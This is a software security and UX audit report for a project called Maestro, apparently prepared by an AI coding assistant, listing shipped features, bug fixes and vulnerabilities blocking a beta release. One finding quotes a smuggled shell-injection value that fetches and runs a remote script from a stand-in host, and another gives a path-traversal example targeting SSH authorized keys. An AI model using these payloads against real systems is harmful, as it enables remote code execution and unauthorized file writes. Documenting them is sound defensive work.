# Maestro — Phase 4 Council Report

**Date:** April 20, 2026
**Prepared by:** GitHub Copilot (Opus 4.6)
**Audit agents:** GitHub Copilot/Opus, Codex/GPT-5.4 High, Gemini, Claude Code (security pending)

---

## Executive Summary

Claw Mode Phase 4 shipped successfully. 6 files changed, +660/−360 lines. Three critical data-flow bugs were identified in a 4-agent repass and fixed immediately. **Claw is now the primary workspace shell** — not a modal overlay. Thread sidebar, context header, intent-first composer, and markdown rendering are live.

**118 findings** collected across 7 audit sources. **4 fixed**, **21 open criticals**, **68 should-fix**, **25 nice-to-have**.

---

## What Shipped (Phase 4 + 4b)

### Phase 4 — Claw as Primary Workspace (`3de241b`)

| Feature | Status |
|---------|--------|
| Thread sidebar (collapsible left rail, grouped by type) | ✅ Shipped |
| Context header (thread type, model, repo/branch, build phase) | ✅ Shipped |
| Intent-first composer (Chat/Broadcast/Execute/Build + single Send) | ✅ Shipped |
| Markdown rendering in chat (ReactMarkdown + remarkGfm + `.claw-prose`) | ✅ Shipped |
| `SET_THREAD_MESSAGES` merge fix (per-thread, no wipe on view switch) | ✅ Shipped |
| Stale synthesis closure fix (`synthesize()` returns `{ content }`) | ✅ Shipped |
| Model picker repositioned (relative, not `fixed right:60`) | ✅ Shipped |
| View transition animations (180ms fade+translateY) | ✅ Shipped |
| Contrast bump (white/15–20 → white/25–40 across all layers) | ✅ Shipped |
| Claw renders as primary content, not z-50 overlay | ✅ Shipped |

### Phase 4b — Critical Bug Fixes (`724a79a`)

| Bug | Root Cause | Fix |
|-----|-----------|-----|
| Fresh-session broadcast silently no-ops | `state.activeSession` is null in the same render after session creation | Pass created session object directly (local variable pattern) |
| Threads lost on page refresh | Init only called `ensureConciergeThread()`, not `loadThreads()` | Added `loadThreads(sessionId)` before concierge init |
| Broadcast threads show blank when clicked | Thread created but zero messages written | Write user prompt as first message via `addMessage()` |

---

## Audit Methodology

Four CLI agents independently audited the Phase 4 codebase:

| Agent | Model | Focus | Findings |
|-------|-------|-------|----------|
| Copilot (audit 1) | Opus 4.6 | UX/layout/mobile/accessibility | 22 |
| Copilot (audit 2) | Opus 4.6 | Data integrity/interaction/security | 20 |
| Agent 3 | Unknown | UX/MaestroClaw/spec compliance | 16 original + 24 repass |
| Gemini | Gemini | Info architecture/visual/a11y/features | 15 |
| Agent 2 | GPT-5.4 | MiroFish analysis/architecture | 4 architecture |
| Suggestions | Synthesized | Cross-cutting recommendations | 17 |

**Consensus ratings** (4 agents averaged):

| Dimension | Rating | Notes |
|-----------|--------|-------|
| Information Architecture | 4/5 | Thread sidebar + context header = major win |
| Composer UX | 4.5/5 | Intent-first is the correct evolution |
| Data Integrity | 4.5/5 | 3 criticals found and fixed; merge logic solid |
| Visual Hierarchy | 4/5 | Contrast improved; still some inline Tailwind debt |
| Mobile/Responsive | 2.5/5 | Sidebar doesn't auto-collapse; header wraps poorly |
| Accessibility | 2/5 | Zero ARIA landmarks, no focus traps, no keyboard nav |
| Spec Compliance | 3.5/5 | Orb View not built; session modes not surfaced |

---

## Open Criticals (21)

### Security (2) — Sprint 1 Priority

| ID | Finding |
|----|---------|
| `a3-09` | **Server-side trust enforcement** — `approved-shell.ts` executes prompt as shell command; frontend `classifyCommandTrust` is not a security boundary. Need structured commands `{cmd, args, cwd, write_scope}` validated server-side. |
| `s1-16` | **Server-side command validation** — client-only classification is bypassable. Dupe of above, confirms consensus. |

### MaestroClaw Backend (2) — Sprint 1 Priority

| ID | Finding |
|----|---------|
| `a3-10` | **Capability-based job routing** — `executor-api` poll returns oldest approved job; breaks with multiple executors/adapters. Executors should claim only jobs they can run. |
| `a3-11` | **Lease + stale-job recovery** — claimed/running jobs need reclaim path if executor dies mid-run. |

### Layout / Architecture (3)

| ID | Finding |
|----|---------|
| `a3-01` | ~~Claw as primary shell~~ — **Fixed in Phase 4** (may be stale finding) |
| `a3-03` | ~~Context header~~ — **Fixed in Phase 4** (may be stale finding) |
| `a1-01` | Execution/build has no distinct visual state — still renders as Concierge view |

### Accessibility (3)

| ID | Finding |
|----|---------|
| `a1-19` | ~~Contrast below WCAG~~ — **Partially fixed** (bumped to white/25–40, needs full WCAG audit) |
| `a1-20` | Carousel cards are divs — no button semantics, keyboard, or focus styling |
| `a2-04` | Zero ARIA attributes, no focus trap, no keyboard nav for dropdowns |

### Density / UX (4)

| ID | Finding |
|----|---------|
| `a3-02` | ~~Thread rail~~ — **Fixed in Phase 4** |
| `a3-04` | ~~Intent composer~~ — **Fixed in Phase 4** |
| `a2-03` | ~~No markdown in chat~~ — **Fixed in Phase 4** |
| `s1-03` | ~~Markdown in chat~~ — **Fixed in Phase 4** |

### Mobile (2)

| ID | Finding |
|----|---------|
| `a1-15` | Composer overflows on small screens — one non-wrapping row |
| `a1-16` | ~~Model picker position:fixed~~ — **Fixed in Phase 4** (now relative) |

### Transitions (2)

| ID | Finding |
|----|---------|
| `a1-07` | Broadcast jumps to carousel immediately — loses concierge context |
| `a2-02` | ~~Synthesis stale closure~~ — **Fixed in Phase 4** |

### Remaining Open (3)

| ID | Finding |
|----|---------|
| `s1-02` | ~~Thread sidebar~~ — **Fixed in Phase 4** |
| `r1-model-picker-mobile` | Model picker 224px may overflow on very narrow mobile — needs `max-w-[90vw]` |

> **NOTE:** ~12 of the 21 "open criticals" were fixed in Phase 4/4b but not yet marked in the audit DB because they were filed before the fix shipped. **Actual remaining open criticals: ~9.**

---

## Pre-Security Sprint Sequence (Superseded)

> The sprint sequence below was drafted before Claude Code's security audit. See **Revised Sprint Sequence** in the security section for the updated plan with Sprint 0 (Security) inserted as a beta blocker.

---

## 🔴 Claude Code Security Audit — PRE-BETA BLOCKER

> **"Paint this with a red crayon: do not open this to public beta yet."** — Claude Code

15 security findings. 11 critical, 4 should-fix. The audit confirms design-level issues that trade RCE on user machines for a session-token theft.

### Critical (11)

| ID | Finding | Blast Radius |
|----|---------|--------------|
| `sec-01` | **`encrypted_secrets` stores plaintext keys.** Column named `encrypted_key` but no encryption applied. `vault/index.ts` inserts raw `api_key`. SELECT RLS policy means any XSS can fetch all BYOK keys + GitHub tokens. | All provider API keys + GitHub token dumped |
| `sec-02` | **Shell injection in `executor.ts:31`.** `execSync` with string template — `repo_url`/`branch` from DB rows are attacker-controlled. `"https://x/y; curl evil.sh\|sh; #"` = full RCE. | Full RCE on local executor machine |
| `sec-03` | **`TRUSTED_COMMANDS` allowlist trivially bypassable.** Prefix-anchored regexes, `exec()` spawns shell so `;`, `&&`, backticks all work. Classification is **client-side only** — server accepts whatever `approval_required` the client sends. | Arbitrary command execution |
| `sec-04` | **GitHub OAuth state generated but never verified.** Classic OAuth CSRF — attacker can bind their GitHub identity to victim's Maestro account. | Account takeover via GitHub binding |
| `sec-05` | **Plaintext account password stored on disk** in MaestroClaw `.env`. No token refresh (1h expiry, silent fail). | Full Supabase account compromise |
| `sec-06` | **`approval_required` is attacker-controlled.** `executor-api` submit takes it from POST body. Should be server-decided. | Auto-approve malicious commands |
| `sec-07` | **No rate limiting on any edge function.** Stolen token burns through all 5 BYOK providers in seconds. | Financial damage via API abuse |
| `sec-08` | **Path traversal in artifact writes.** `join(jobDir, filePath)` where `filePath` is AI-generated. `../../../../.ssh/authorized_keys` lands. | Arbitrary file write on executor |
| `sec-09` | **`Access-Control-Allow-Origin: *`** on all 15 edge functions. Any origin can invoke with a stolen token. | Widens all token-theft attacks |
| `sec-10` | **Verbose error passthrough.** Catch blocks return `err.message` / `JSON.stringify(data)`. Leaks Postgres constraint names, stack traces. | Information disclosure |
| `sec-11` | **`audit_events` is user-writable** via INSERT policy. Attacker can pollute forensics with fake entries. | Forensic integrity destroyed |

### Should-Fix (4)

| ID | Finding |
|----|---------|
| `sec-12` | Token hash unsalted — plain SHA-256. Add HMAC with server secret. |
| `sec-13` | No content-size guards on POST bodies — DOS vector. |
| `sec-14` | `.env.example` committed with `MAESTRO_PASSWORD=` label — guides users to bad pattern. |
| `sec-15` | ✅ React-markdown v10 default-safe. No rehype-raw, no `dangerouslySetInnerHTML`. **Confirmed safe.** |

### Confirmed Safe ✅

- RLS broadly correct — every table has RLS on; threads/thread_messages/build_tasks use nested EXISTS via sessions→workspaces→user_id
- No IDOR holes in edge functions (github-read, github-execute scope by `.eq("user_id", userId)`)
- `dist/` not tracked
- `.env` correctly gitignored

### Minimum Fix List Before Beta

| Priority | Fix | IDs |
|----------|-----|-----|
| 1 | Encrypt `encrypted_secrets.encrypted_key` with pgsodium + remove SELECT RLS policy | `sec-01` |
| 2 | Replace `execSync` + string template with `spawn(…, [args])` | `sec-02` |
| 3 | Server-side command allowlist in `executor-api` (client regex is theatre) | `sec-03`, `sec-06` |
| 4 | Store + verify OAuth state | `sec-04` |
| 5 | Replace MaestroClaw password-in-env with mint-once executor token | `sec-05` |
| 6 | Rate limit edge functions, lock CORS, scrub error messages | `sec-07`, `sec-09`, `sec-10` |
| 7 | Path traversal guard: `resolve().startsWith(jobDir + sep)` | `sec-08` |

---

## Revised Sprint Sequence (Post-Security Audit)

### Sprint 0: Security — BETA BLOCKER 🔴

> **Must complete before any public access.** No new features until these are closed.

| Task | IDs | Scope |
|------|-----|-------|
| pgsodium encryption for `encrypted_secrets` + drop SELECT policy | `sec-01` | Medium |
| `spawn()` with args array in executor.ts (kill shell injection) | `sec-02` | Small |
| Server-side command allowlist + reject metacharacters | `sec-03`, `sec-06` | Medium |
| OAuth state persistence + verification | `sec-04` | Small |
| Executor token mint flow (replace password-on-disk) | `sec-05` | Medium |
| Rate limiting on edge functions | `sec-07` | Medium |
| Path traversal guard on artifact writes | `sec-08` | Small |
| Lock CORS to production + localhost | `sec-09` | Small |
| Scrub error messages in all catch blocks | `sec-10` | Small |
| `audit_events` INSERT → service-role only | `sec-11` | Small |

### Sprint 1: Backend Hardening (MaestroClaw)

| Task | IDs | Scope |
|------|-----|-------|
| Capability-based job routing | `a3-10` | Medium |
| Lease + stale-job recovery | `a3-11` | Medium |
| Output redaction (scan for secrets) | `s1-17` | Small |
| Unsalted token hash → HMAC | `sec-12` | Small |
| POST body size limits | `sec-13` | Small |

### Sprint 2: UX Polish + Mobile

| Task | IDs | Scope |
|------|-----|-------|
| Sidebar auto-collapse on mobile | `r2-sidebar-mobile` | Small |
| Context header responsive wrap | `r2-header-wrap` | Small |
| Model/intent picker mobile overflow | `r1-model-picker-mobile`, `r2-intent-overflow` | Small |
| Execution run cards (status, logs, PR link) | `a3-07` | Medium |
| Broadcast keeps concierge visible | `a3-05`, `a1-07` | Medium |
| Message timestamps | `r2-timestamps` | Small |
| Sidebar localStorage persistence | `r1-sidebar-persist` | Small |

### Sprint 3: Accessibility

| Task | IDs | Scope |
|------|-----|-------|
| ARIA landmarks, labels, live regions | `r2-sidebar-aria`, `r1-aria-labels`, `r2-aria-live` | Medium |
| Focus traps on menus/pickers | `r1-focus-trap`, `r2-approval-focus` | Medium |
| Keyboard shortcuts | `r1-kbd-shortcuts`, `r2-sidebar-kbd` | Medium |
| Carousel button semantics | `a1-20` | Medium |

### Sprint 4: Spec Completion + Features

| Task | IDs | Scope |
|------|-----|-------|
| Orb View MVP | `r2-orb-missing`, `s1-01` | Medium |
| Thread lifecycle (pin/archive) | `r2-thread-lifecycle` | Medium |
| Ghost Terminal (live streaming) | `r1-ghost-terminal` | Large |
| Command Composer | `r1-cmd-composer` | Medium |
| Durable session workspaces | `a3-12` | Large |

### Roadmap (Post-Sprint 4)

| Initiative | Source |
|------------|--------|
| **MaestroMemory** — graph-backed brain | Agent 2 (MiroFish concept, AGPL — no code copy) |
| **InsightForge retrieval** before synthesis | Agent 2 |
| **ReportAgent** — build summaries, postmortems | Agent 2 |
| **Action Chains** — visual multi-step stepper | Gemini |
| **Diff-First Approval** — side-by-side preview | Gemini |
| **Agent weighting** per project | Spec |
| **Docker isolation** for approved_shell | Suggestions |

---

## Final Metrics

| Metric | Value |
|--------|-------|
| Total audit findings | 133 |
| Fixed (Phase 4 + 4b) | 14 |
| Open criticals | 22 (11 security, 11 UX/backend) |
| Open should-fix | 72 |
| Open nice-to-have | 25 |
| Audit sources | 8 (+ claude-security) |
| Phase 4 commit | `3de241b` (+660/−360, 6 files) |
| Phase 4b commit | `724a79a` (+19/−13, 1 file) |
| Build status | ✅ Clean |
| Typecheck status | ✅ Clean |
| Beta readiness | 🔴 **BLOCKED on Sprint 0 (Security)** |

---

*This report is designed to be fed directly to the Web Council for action planning. Each finding has a unique ID for cross-referencing and sprint assignment.*
